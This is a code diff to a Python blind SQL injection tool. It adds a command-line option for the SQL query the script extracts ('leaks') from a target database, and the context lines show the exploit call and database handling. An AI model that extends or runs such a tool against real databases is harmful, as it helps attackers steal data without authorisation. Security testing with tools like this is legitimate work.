@@ -7,6 +7,7 @@ import time
 import urllib3
 import requests
 import datetime
+import argparse
 from enum import Enum
 
 
@@ -360,7 +361,7 @@ def save_leak(query, leak):
         print('[!] no output!')
 
 
-def main():
+def main(args):
     print('\033[1m\033[94mBlind SQL injection script\033[0m\033[0m\n')
 
     if database == DBType.PostgreSQL:
@@ -379,10 +380,13 @@ def main():
 
     start = time.time()
 
-    query = input('enter query: ')
-    sys.stdout.buffer.write(b"\033[F\033[K")
-    if query == '':
-        print('using demo query\n')
+    if args.query is not None:
+        query = args.query
+    else:
+        query = input('enter query: ')
+        sys.stdout.buffer.write(b"\033[F\033[K")
+        if query == '':
+            print('using demo query\n')
 
     # exploit!
     leak = db.leak_query(query)
@@ -396,7 +400,14 @@ def main():
 
 if __name__ == '__main__':
     try:
-        main()
+        parser = argparse.ArgumentParser(description='MySQLi, a blind SQL injection script')
+        parser.add_argument('-q',
+                            '--query',
+                            dest='query',
+                            help='The SQL query to leak',
+                            default=None)
+        args = parser.parse_args()
+        main(args)
     except KeyboardInterrupt:
         print('')
 
